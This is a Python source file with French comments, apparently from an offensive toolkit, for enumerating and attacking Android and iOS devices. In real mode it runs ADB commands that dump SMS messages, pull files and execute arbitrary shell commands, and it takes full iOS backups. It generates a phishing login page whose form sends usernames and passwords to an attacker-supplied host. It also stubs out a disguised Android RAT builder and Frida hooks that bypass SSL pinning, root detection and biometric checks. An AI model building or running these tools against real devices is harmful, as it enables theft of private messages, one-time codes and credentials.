"""
MobileService — Énumération et exploitation mobile Android/iOS.
Simulation réaliste si outils absents (ADB, frida, apktool).
"""
from __future__ import annotations

import asyncio
import json
import logging
import os
import random
import shutil
import string
import time
from pathlib import Path
from typing import Optional

logger = logging.getLogger(__name__)

SIMULATION_MODE = os.getenv("SIMULATION_MODE", "true").lower() == "true"
_OUTPUT_DIR = Path("./data/mobile_output")
_OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

# ── Helpers ───────────────────────────────────────────────────────────────────

async def _run(cmd: list[str], timeout: int = 30) -> tuple[str, str, int]:
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            proc.kill()
            await proc.communicate()
            return "", "Timeout", -1
        return stdout.decode("utf-8", errors="replace"), stderr.decode("utf-8", errors="replace"), proc.returncode
    except FileNotFoundError as e:
        return "", str(e), -1


# ── Mock data ─────────────────────────────────────────────────────────────────

_MOCK_DEVICES = [
    {"serial": "emulator-5554", "model": "Pixel 7 Pro", "android_version": "14", "sdk": "34", "rooted": True, "developer_mode": True, "usb_debugging": True, "ip": "10.0.2.15"},
    {"serial": "RF8N123ABCD", "model": "Samsung Galaxy S24", "android_version": "14", "sdk": "34", "rooted": False, "developer_mode": False, "usb_debugging": True, "ip": "192.168.1.105"},
]

_MOCK_INSTALLED_APPS = [
    {"package": "com.whatsapp", "version": "2.24.7.77", "last_used": "2026-06-07", "permissions": ["CAMERA", "CONTACTS", "LOCATION", "MICROPHONE", "STORAGE"], "interesting": False},
    {"package": "com.google.android.gm", "version": "2024.03.17", "last_used": "2026-06-07", "permissions": ["CONTACTS", "INTERNET", "STORAGE"], "interesting": False},
    {"package": "com.corp.vpnclient", "version": "3.1.2", "last_used": "2026-06-06", "permissions": ["INTERNET", "VPN_SERVICE", "READ_LOGS"], "interesting": True, "note": "VPN client avec accès aux logs"},
    {"package": "com.banking.app", "version": "1.8.4", "last_used": "2026-06-07", "permissions": ["CAMERA", "LOCATION", "BIOMETRIC", "INTERNET"], "interesting": True, "note": "Application bancaire"},
    {"package": "com.corp.mdm", "version": "5.2.1", "last_used": "2026-06-05", "permissions": ["DEVICE_ADMIN", "INSTALL_PACKAGES", "READ_LOGS", "READ_CONTACTS"], "interesting": True, "note": "MDM — admin device complet"},
]

_MOCK_APK_ANALYSIS = {
    "package_name": "com.target.app",
    "version": "2.4.1",
    "min_sdk": 21, "target_sdk": 34,
    "permissions": ["android.permission.INTERNET", "android.permission.ACCESS_FINE_LOCATION", "android.permission.READ_CONTACTS"],
    "vulnerabilities": [
        {"severity": "HIGH", "type": "Hardcoded Credentials", "location": "com/target/app/BuildConfig.java:45", "detail": "API_KEY hardcodé en clair dans les sources"},
        {"severity": "HIGH", "type": "Insecure Data Storage", "location": "com/target/app/utils/StorageUtil.java:89", "detail": "Données sensibles stockées en SharedPreferences non chiffré"},
        {"severity": "MEDIUM", "type": "Weak Cryptography", "location": "com/target/app/crypto/CryptoHelper.java:12", "detail": "ECB mode utilisé pour AES"},
        {"severity": "MEDIUM", "type": "SSL Pinning Bypass", "location": "com/target/app/network/ApiClient.java:67", "detail": "Certificate pinning facilement bypassable avec Frida"},
        {"severity": "LOW", "type": "Debug Mode Enabled", "location": "AndroidManifest.xml", "detail": "android:debuggable=true en production"},
    ],
    "exported_components": [
        {"type": "Activity", "name": "com.target.app.DeepLinkActivity", "exported": True, "note": "DeepLink sans validation — potentiel redirect attack"},
        {"type": "Provider", "name": "com.target.app.DataProvider", "exported": True, "permission": None, "note": "ContentProvider exporté sans permission"},
    ],
    "hardcoded_strings": [
        "https://api.target.com/v2", "sk_live_TARGET...", "admin:Password123!"
    ],
    "simulation": True,
}

_MOCK_IOS_BACKUP = {
    "device_id": "00008120-001A2B3C4D5E6F7A",
    "ios_version": "17.4.1",
    "device_name": "iPhone 15 Pro",
    "backup_date": "2026-06-07",
    "apps_count": 156,
    "interesting_files": [
        {"path": "Library/Safari/Bookmarks.db", "type": "SQLite", "content_preview": "Banking, VPN, Corp Portal URLs"},
        {"path": "Library/Cookies/Cookies.binarycookies", "type": "Binary Cookies", "content_preview": "Session cookies corp.local"},
        {"path": "HomeDomain/Library/Preferences/com.corp.app.plist", "type": "Plist", "content_preview": {"stored_password": "C0rpApp2026!", "username": "john.doe"}},
        {"path": "AppDomainGroup-group.com.banking.app/Documents/", "type": "Directory", "content_preview": "Transaction history, account data"},
    ],
    "keychain_entries": [
        {"service": "com.corp.vpn", "account": "john.doe@corp.com", "note": "VPN credentials"},
        {"service": "com.banking.app", "account": "user@email.com", "note": "Banking credentials"},
    ],
    "simulation": True,
}


# ── Service ───────────────────────────────────────────────────────────────────

class MobileService:

    def __init__(self):
        self.simulation_mode = SIMULATION_MODE
        self.tools = {
            "adb": bool(shutil.which("adb")),
            "apktool": bool(shutil.which("apktool")),
            "jadx": bool(shutil.which("jadx")),
            "frida": bool(shutil.which("frida")),
            "frida_server": bool(shutil.which("frida-server")),
            "idevicebackup2": bool(shutil.which("idevicebackup2")),
        }

    # ── Android / ADB ─────────────────────────────────────────────────────────

    async def list_adb_devices(self) -> list[dict]:
        if self.simulation_mode or not self.tools["adb"]:
            await asyncio.sleep(1)
            return _MOCK_DEVICES

        stdout, _, _ = await _run(["adb", "devices", "-l"])
        devices = []
        for line in stdout.splitlines()[1:]:
            if line.strip() and "device" in line:
                parts = line.split()
                serial = parts[0]
                model = ""
                for part in parts:
                    if part.startswith("model:"):
                        model = part.replace("model:", "").replace("_", " ")
                out2, _, _ = await _run(["adb", "-s", serial, "shell", "getprop", "ro.build.version.release"])
                android_ver = out2.strip()
                devices.append({"serial": serial, "model": model, "android_version": android_ver, "usb_debugging": True})
        return devices

    async def adb_enumerate_device(self, serial: str) -> dict:
        if self.simulation_mode or not self.tools["adb"]:
            await asyncio.sleep(2)
            return {
                "device": _MOCK_DEVICES[0],
                "installed_apps": _MOCK_INSTALLED_APPS,
                "interesting_apps": [a for a in _MOCK_INSTALLED_APPS if a.get("interesting")],
                "simulation": True,
            }
        stdout, _, _ = await _run(["adb", "-s", serial, "shell", "pm", "list", "packages", "-3"])
        packages = [line.replace("package:", "").strip() for line in stdout.splitlines() if line.startswith("package:")]
        return {"installed_apps": [{"package": p} for p in packages]}

    async def adb_dump_sms(self, serial: str) -> list[dict]:
        if self.simulation_mode:
            await asyncio.sleep(1)
            return [
                {"date": "2026-06-07 09:12:34", "from": "+33612345678", "body": "Votre code OTP: 847291", "type": "received"},
                {"date": "2026-06-07 08:45:11", "from": "Corp-IT", "body": "Nouveau mot de passe: TempPass2026!", "type": "received"},
                {"date": "2026-06-06 17:23:45", "from": "+33698765432", "body": "Rdv demain 14h pour la réunion confidentielle", "type": "received"},
            ]
        if not self.tools["adb"]:
            return []
        stdout, _, _ = await _run(["adb", "-s", serial, "shell",
            "content", "query", "--uri", "content://sms",
            "--projection", "date:address:body:type"], timeout=15)
        return [{"raw": line} for line in stdout.splitlines()[:50]]

    async def adb_pull_file(self, serial: str, remote_path: str) -> str:
        if self.simulation_mode:
            local_path = str(_OUTPUT_DIR / f"adb_pull_{int(time.time())}.bin")
            Path(local_path).write_text(f"[SIMULATED] Content of {remote_path}")
            return local_path
        if not self.tools["adb"]:
            return ""
        local_path = str(_OUTPUT_DIR / f"adb_pull_{int(time.time())}.bin")
        await _run(["adb", "-s", serial, "pull", remote_path, local_path], timeout=30)
        return local_path

    async def adb_shell_command(self, serial: str, command: str) -> str:
        if self.simulation_mode:
            await asyncio.sleep(0.5)
            return f"[SIMULATED] {command}: output\nroot@device:/ #" if "root" in command else f"shell@device:/ $ {command}\nOK"
        if not self.tools["adb"]:
            return ""
        stdout, _, _ = await _run(["adb", "-s", serial, "shell", command], timeout=20)
        return stdout[:2000]

    async def generate_android_rat(self, lhost: str, lport: int, app_name: str = "Calculator") -> dict:
        if self.simulation_mode:
            await asyncio.sleep(2)
            apk_path = str(_OUTPUT_DIR / f"rat_{app_name.lower()}_{lhost}_{lport}.apk")
            Path(apk_path).write_bytes(b"[SIMULATED ANDROID RAT APK - NOT EXECUTABLE]")
            return {
                "apk_path": apk_path,
                "lhost": lhost,
                "lport": lport,
                "app_name": app_name,
                "permissions_needed": ["INTERNET", "READ_SMS", "ACCESS_FINE_LOCATION", "CAMERA", "RECORD_AUDIO"],
                "install_cmd": f"adb install {apk_path}",
                "simulation": True,
            }
        return {"error": "msfvenom requis en mode réel"}

    async def analyze_apk(self, apk_path: str) -> dict:
        if self.simulation_mode or not (self.tools["apktool"] or self.tools["jadx"]):
            await asyncio.sleep(3)
            result = dict(_MOCK_APK_ANALYSIS)
            result["apk_path"] = apk_path
            return result

        out_dir = str(_OUTPUT_DIR / f"apk_decompile_{int(time.time())}")
        await _run(["apktool", "d", apk_path, "-o", out_dir, "-f"], timeout=60)
        return {"decompiled_to": out_dir, "simulation": False}

    async def frida_hook(self, device_serial: str, package: str, script_type: str = "ssl_bypass") -> dict:
        if self.simulation_mode:
            await asyncio.sleep(2)
            scripts = {
                "ssl_bypass": "SSL pinning bypassé — trafic interceptable sur 0.0.0.0:8888",
                "root_bypass": "Root detection bypassée — app démarre normalement",
                "biometric_bypass": "Authentification biométrique contournée",
                "debugger_bypass": "Anti-debug contourné",
            }
            return {"success": True, "script": script_type, "output": scripts.get(script_type, "Script appliqué"), "simulation": True}
        if not self.tools["frida"]:
            return {"success": False, "error": "Frida non disponible"}
        return {"success": False, "error": "Mode réel : frida-server doit tourner sur le device"}

    async def create_phishing_page(self, target_app: str, lhost: str, lport: int) -> dict:
        if self.simulation_mode:
            page_dir = _OUTPUT_DIR / f"phishing_{target_app}_{int(time.time())}"
            page_dir.mkdir(exist_ok=True)
            (page_dir / "index.html").write_text(f"""<!DOCTYPE html>
<html><head><title>{target_app} - Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>body{{font-family:sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;height:100vh}}.card{{background:#fff;padding:2rem;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.15);width:320px}}</style>
</head><body><div class="card"><h2>{target_app}</h2>
<form action="http://{lhost}:{lport}/capture" method="POST">
<input name="username" placeholder="Email" style="width:100%;margin:8px 0;padding:10px;border:1px solid #ddd;border-radius:6px"><br>
<input name="password" type="password" placeholder="Mot de passe" style="width:100%;margin:8px 0;padding:10px;border:1px solid #ddd;border-radius:6px"><br>
<button type="submit" style="width:100%;padding:12px;background:#1877f2;color:#fff;border:0;border-radius:6px;font-size:16px">Connexion</button>
</form></div></body></html>""")
            return {
                "page_dir": str(page_dir),
                "html_file": str(page_dir / "index.html"),
                "capture_url": f"http://{lhost}:{lport}/capture",
                "simulation": True,
            }
        return {}

    # ── iOS ───────────────────────────────────────────────────────────────────

    async def extract_ios_backup(self, device_id: str = "") -> dict:
        if self.simulation_mode or not self.tools["idevicebackup2"]:
            await asyncio.sleep(3)
            return _MOCK_IOS_BACKUP

        backup_dir = str(_OUTPUT_DIR / f"ios_backup_{int(time.time())}")
        Path(backup_dir).mkdir(exist_ok=True)
        await _run(["idevicebackup2", "backup", "--full", backup_dir], timeout=300)
        return {"backup_dir": backup_dir, "simulation": False}

    async def analyze_ipa(self, ipa_path: str) -> dict:
        if self.simulation_mode:
            await asyncio.sleep(2)
            return {
                "bundle_id": "com.target.app.ios",
                "version": "3.1.2",
                "min_ios": "14.0",
                "vulnerabilities": [
                    {"severity": "HIGH", "type": "ATS Disabled", "detail": "NSAllowsArbitraryLoads=true — SSL non obligatoire"},
                    {"severity": "HIGH", "type": "Jailbreak Detection Bypass", "detail": "Détection basique bypassable avec Shadow"},
                    {"severity": "MEDIUM", "type": "Sensitive Data in Keychain", "detail": "Credentials stockés avec kSecAttrAccessibleAlways"},
                ],
                "url_schemes": ["targetapp://", "targetapp-auth://"],
                "simulation": True,
            }
        return {}


mobile_service = MobileService()
